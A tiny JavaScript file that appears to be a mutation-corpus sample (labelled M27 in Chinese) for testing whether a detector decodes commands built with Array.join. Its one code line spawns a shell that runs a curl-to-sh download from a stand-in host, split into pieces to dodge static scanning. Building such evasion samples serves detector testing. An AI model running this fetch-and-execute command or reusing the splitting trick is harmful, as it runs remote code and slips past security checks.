// round-16 变异语料 M27：Array.join 常量组装实参（N2 join 解码击杀面）
const { spawn } = require('child_process')
spawn('sh', ['-c', ['curl', ' -s http://x/p.bin', ' | sh'].join('')])
